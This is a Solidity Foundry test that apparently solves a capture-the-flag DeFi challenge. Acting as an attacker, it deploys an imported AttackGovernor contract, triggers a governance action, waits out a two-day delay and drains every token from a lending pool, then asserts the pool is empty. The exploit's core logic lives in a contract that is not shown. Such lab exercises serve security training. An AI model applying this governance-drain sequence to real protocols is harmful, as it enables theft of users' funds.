// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/GovernorFixture.sol";

import "src/src-default/governor/AttackGovernor.sol";

contract GovernorTest is GovernorFixture {
    AttackGovernor attackGovernor;

    function setUp() public override {
        super.setUp();
    }

    function test_governor() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
        /*
            ---- We have to get all the funds ---- 
        */

        attackGovernor = new AttackGovernor(address(pool), address(governance));
        attackGovernor.attack();

        // Advance time 2 days so that the action can be executed
        vm.warp(block.timestamp + 2 days); // 2 days

        attackGovernor.drainFunds();

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}